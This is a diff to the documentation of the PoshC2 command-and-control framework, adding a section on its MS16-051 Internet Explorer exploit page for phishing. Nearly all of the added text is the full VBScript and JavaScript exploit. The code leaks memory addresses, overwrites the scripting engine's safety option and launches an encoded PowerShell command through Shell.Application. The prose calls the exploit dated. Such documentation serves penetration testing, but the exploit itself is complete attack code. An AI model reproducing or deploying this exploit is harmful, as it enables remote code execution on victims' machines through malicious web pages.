@@ -90,6 +90,7 @@
               <ul class="current">
 <li class="toctree-l1"><a class="reference internal" href="../install_and_setup/index.html">Installation &amp; Setup</a></li>
 <li class="toctree-l1 current"><a class="reference internal" href="index.html">Execution / Payloads</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="core.html">Core Dropper</a></li>
 <li class="toctree-l2"><a class="reference internal" href="bat.html">Bat File</a></li>
 <li class="toctree-l2"><a class="reference internal" href="exe.html">Stand Alone Executable</a></li>
 <li class="toctree-l2"><a class="reference internal" href="serviceexe.html">Service Executable</a></li>
@@ -178,6 +179,148 @@
             
   <div class="section" id="ms16-051-html-file">
 <h1>MS16-051 HTML File<a class="headerlink" href="#ms16-051-html-file" title="Permalink to this headline">¶</a></h1>
+<p>After the Internet Explorer bug was released (MS16-051), this was incorporated into PoshC2 as a potential exploit that could be used to obtain C2 communications via an embedded link. This update was critical and found exploitable in Internet Explorer 9, 10, 11. This code is was released in 2016 and is high unlikely to be sucessful in a phishing campaign today. Nevertheless, the code is still within PoshC2:</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">html</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">head</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">meta</span> <span class="n">http</span><span class="o">-</span><span class="n">equiv</span><span class="o">=</span><span class="s2">&quot;x-ua-compatible&quot;</span> <span class="n">content</span><span class="o">=</span><span class="s2">&quot;IE=10&quot;</span><span class="o">&gt;</span>
+<span class="o">&lt;/</span><span class="n">head</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">body</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="n">script</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;text/vbscript&quot;</span><span class="o">&gt;</span>
+        <span class="n">Dim</span> <span class="n">aw</span>
+        <span class="n">Dim</span> <span class="n">plunge</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
+        <span class="n">Dim</span> <span class="n">y</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
+        <span class="n">prefix</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">%u</span><span class="s2">4141</span><span class="si">%u</span><span class="s2">4141&quot;</span>
+        <span class="n">d</span> <span class="o">=</span> <span class="n">prefix</span> <span class="o">&amp;</span> <span class="s2">&quot;</span><span class="si">%u</span><span class="s2">0016</span><span class="si">%u</span><span class="s2">4141</span><span class="si">%u</span><span class="s2">4141</span><span class="si">%u</span><span class="s2">4141</span><span class="si">%u</span><span class="s2">4242</span><span class="si">%u</span><span class="s2">4242&quot;</span>
+        <span class="n">b</span> <span class="o">=</span> <span class="n">String</span><span class="p">(</span><span class="mi">64000</span><span class="p">,</span> <span class="s2">&quot;D&quot;</span><span class="p">)</span>
+        <span class="n">c</span> <span class="o">=</span> <span class="n">d</span> <span class="o">&amp;</span> <span class="n">b</span>
+        <span class="n">x</span> <span class="o">=</span> <span class="n">UnEscape</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+
+        <span class="n">Class</span> <span class="n">ArrayWrapper</span>
+            <span class="n">Dim</span> <span class="n">A</span><span class="p">()</span>
+            <span class="n">Private</span> <span class="n">Sub</span> <span class="n">Class_Initialize</span>
+                <span class="s1">&#39; 2x2000 elements x 16 bytes / element = 64000 bytes</span>
+                <span class="n">ReDim</span> <span class="n">Preserve</span> <span class="n">A</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2000</span><span class="p">)</span>
+            <span class="n">End</span> <span class="n">Sub</span>
+
+            <span class="n">Public</span> <span class="n">Sub</span> <span class="n">Resize</span><span class="p">()</span>
+                <span class="n">ReDim</span> <span class="n">Preserve</span> <span class="n">A</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+            <span class="n">End</span> <span class="n">Sub</span>
+        <span class="n">End</span> <span class="n">Class</span>
+
+        <span class="n">Class</span> <span class="n">Dummy</span>
+        <span class="n">End</span> <span class="n">Class</span>
+
+        <span class="n">Function</span> <span class="n">getAddr</span> <span class="p">(</span><span class="n">arg1</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span>
+            <span class="n">aw</span> <span class="o">=</span> <span class="n">Null</span>
+            <span class="n">Set</span> <span class="n">aw</span> <span class="o">=</span> <span class="n">New</span> <span class="n">ArrayWrapper</span>
+
+            <span class="n">For</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span> <span class="n">To</span> <span class="mi">32</span>
+                <span class="n">Set</span> <span class="n">plunge</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">=</span> <span class="n">s</span>
+            <span class="n">Next</span>
+
+            <span class="n">Set</span> <span class="n">aw</span><span class="o">.</span><span class="n">A</span><span class="p">(</span><span class="n">arg1</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="o">=</span> <span class="n">s</span>
+
+            <span class="n">Dim</span> <span class="n">addr</span>
+            <span class="n">Dim</span> <span class="n">i</span>
+            <span class="n">For</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span> <span class="n">To</span> <span class="mi">31</span>
+                <span class="n">If</span> <span class="n">Asc</span><span class="p">(</span><span class="n">Mid</span><span class="p">(</span><span class="n">y</span><span class="p">(</span><span class="n">i</span><span class="p">),</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span> <span class="o">=</span> <span class="n">VarType</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="n">Then</span>
+                    <span class="n">addr</span> <span class="o">=</span> <span class="n">strToInt</span><span class="p">(</span><span class="n">Mid</span><span class="p">(</span><span class="n">y</span><span class="p">(</span><span class="n">i</span><span class="p">),</span> <span class="mi">3</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span>
+                <span class="n">End</span> <span class="n">If</span>
+                <span class="n">y</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">=</span> <span class="n">Null</span>
+            <span class="n">Next</span>
+
+            <span class="n">If</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">Null</span> <span class="n">Then</span>
+                <span class="n">document</span><span class="o">.</span><span class="n">location</span><span class="o">.</span><span class="n">href</span> <span class="o">=</span> <span class="n">document</span><span class="o">.</span><span class="n">location</span><span class="o">.</span><span class="n">href</span>
+                <span class="n">Return</span>
+            <span class="n">End</span> <span class="n">If</span>
+
+            <span class="n">getAddr</span> <span class="o">=</span> <span class="n">addr</span>
+        <span class="n">End</span> <span class="n">Function</span>
+
+        <span class="n">Function</span> <span class="n">leakMem</span> <span class="p">(</span><span class="n">arg1</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span>
+            <span class="n">d</span> <span class="o">=</span> <span class="n">prefix</span> <span class="o">&amp;</span> <span class="s2">&quot;</span><span class="si">%u</span><span class="s2">0008</span><span class="si">%u</span><span class="s2">4141</span><span class="si">%u</span><span class="s2">4141</span><span class="si">%u</span><span class="s2">4141&quot;</span>
+            <span class="n">c</span> <span class="o">=</span> <span class="n">d</span> <span class="o">&amp;</span> <span class="n">intToStr</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">b</span>
+            <span class="n">x</span> <span class="o">=</span> <span class="n">UnEscape</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+
+            <span class="n">aw</span> <span class="o">=</span> <span class="n">Null</span>
+            <span class="n">Set</span> <span class="n">aw</span> <span class="o">=</span> <span class="n">New</span> <span class="n">ArrayWrapper</span>
+
+            <span class="n">Dim</span> <span class="n">o</span>
+            <span class="n">o</span> <span class="o">=</span> <span class="n">aw</span><span class="o">.</span><span class="n">A</span><span class="p">(</span><span class="n">arg1</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+
+            <span class="n">leakMem</span> <span class="o">=</span> <span class="n">o</span>
+        <span class="n">End</span> <span class="n">Function</span>
+
+        <span class="n">Sub</span> <span class="n">overwrite</span> <span class="p">(</span><span class="n">arg1</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span>
+            <span class="n">d</span> <span class="o">=</span> <span class="n">prefix</span> <span class="o">&amp;</span> <span class="s2">&quot;</span><span class="si">%u</span><span class="s2">400C</span><span class="si">%u</span><span class="s2">0000</span><span class="si">%u</span><span class="s2">0000</span><span class="si">%u</span><span class="s2">0000&quot;</span>
+            <span class="n">c</span> <span class="o">=</span> <span class="n">d</span> <span class="o">&amp;</span> <span class="n">intToStr</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">b</span>
+            <span class="n">x</span> <span class="o">=</span> <span class="n">UnEscape</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+
+            <span class="n">aw</span> <span class="o">=</span> <span class="n">Null</span>
+            <span class="n">Set</span> <span class="n">aw</span> <span class="o">=</span> <span class="n">New</span> <span class="n">ArrayWrapper</span>
+
+            <span class="s1">&#39; Single has vartype of 0x04</span>
+            <span class="n">aw</span><span class="o">.</span><span class="n">A</span><span class="p">(</span><span class="n">arg1</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="o">=</span> <span class="n">CSng</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+        <span class="n">End</span> <span class="n">Sub</span>
+
+        <span class="n">Function</span> <span class="n">exploit</span> <span class="p">(</span><span class="n">arg1</span><span class="p">)</span>
+            <span class="n">Dim</span> <span class="n">addr</span>
+            <span class="n">Dim</span> <span class="n">csession</span>
+            <span class="n">Dim</span> <span class="n">olescript</span>
+            <span class="n">Dim</span> <span class="n">mem</span>
+
+            <span class="s1">&#39; Create a vbscript class instance</span>
+            <span class="n">Set</span> <span class="n">dm</span> <span class="o">=</span> <span class="n">New</span> <span class="n">Dummy</span>
+            <span class="s1">&#39; Get address of the class instance</span>
+            <span class="n">addr</span> <span class="o">=</span> <span class="n">getAddr</span><span class="p">(</span><span class="n">arg1</span><span class="p">,</span> <span class="n">dm</span><span class="p">)</span>
+            <span class="s1">&#39; Leak CSession address from class instance</span>
+            <span class="n">mem</span> <span class="o">=</span> <span class="n">leakMem</span><span class="p">(</span><span class="n">arg1</span><span class="p">,</span> <span class="n">addr</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span>
+            <span class="n">csession</span> <span class="o">=</span> <span class="n">strToInt</span><span class="p">(</span><span class="n">Mid</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span>
+            <span class="s1">&#39; Leak COleScript address from CSession instance</span>
+            <span class="n">mem</span> <span class="o">=</span> <span class="n">leakMem</span><span class="p">(</span><span class="n">arg1</span><span class="p">,</span> <span class="n">csession</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span>
+            <span class="n">olescript</span> <span class="o">=</span> <span class="n">strToInt</span><span class="p">(</span><span class="n">Mid</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span>
+            <span class="s1">&#39; Overwrite SafetyOption in COleScript (e.g. god mode)</span>
+            <span class="s1">&#39; e.g. changes it to 0x04 which is not in 0x0B mask</span>
+            <span class="n">overwrite</span> <span class="n">arg1</span><span class="p">,</span> <span class="n">olescript</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">H174</span>
+
+            <span class="s1">&#39; Execute cmd</span>
+            <span class="n">Set</span> <span class="n">Object</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s2">&quot;Shell.Application&quot;</span><span class="p">)</span>
+            <span class="n">Object</span><span class="o">.</span><span class="n">ShellExecute</span> <span class="s2">&quot;powershell -exec bypass -e &lt;encoded command&gt;&quot;</span>
+        <span class="n">End</span> <span class="n">Function</span>
+
+        <span class="n">Function</span> <span class="n">triggerBug</span>
+            <span class="s1">&#39; Resize array we are currently indexing</span>
+            <span class="n">aw</span><span class="o">.</span><span class="n">Resize</span><span class="p">()</span>
+
+            <span class="s1">&#39; Overlap freed array area with our exploit string</span>
+            <span class="n">Dim</span> <span class="n">i</span>
+            <span class="n">For</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span> <span class="n">To</span> <span class="mi">32</span>
+                <span class="s1">&#39; 24000x2 + 6 = 48006 bytes</span>
+                <span class="n">y</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">=</span> <span class="n">Mid</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">24000</span><span class="p">)</span>
+            <span class="n">Next</span>
+        <span class="n">End</span> <span class="n">Function</span>
+    <span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span>
+
+    <span class="o">&lt;</span><span class="n">script</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;text/javascript&quot;</span><span class="o">&gt;</span>
+        <span class="n">function</span> <span class="n">strToInt</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="n">charCodeAt</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">charCodeAt</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="n">function</span> <span class="n">intToStr</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="k">return</span> <span class="n">String</span><span class="o">.</span><span class="n">fromCharCode</span><span class="p">(</span><span class="n">x</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span> <span class="o">+</span> <span class="n">String</span><span class="o">.</span><span class="n">fromCharCode</span><span class="p">(</span><span class="n">x</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="n">var</span> <span class="n">o</span><span class="p">;</span>
+        <span class="n">o</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;valueOf&quot;</span><span class="p">:</span> <span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
+                <span class="n">triggerBug</span><span class="p">();</span>
+                <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+            <span class="p">}};</span>
+        <span class="n">setTimeout</span><span class="p">(</span><span class="n">function</span><span class="p">()</span> <span class="p">{</span><span class="n">exploit</span><span class="p">(</span><span class="n">o</span><span class="p">);},</span> <span class="mi">50</span><span class="p">);</span>
+    <span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span>
+<span class="o">&lt;/</span><span class="n">body</span><span class="o">&gt;</span>
+<span class="o">&lt;/</span><span class="n">html</span><span class="o">&gt;</span>
+</pre></div>
+</div>
 </div>
 
 
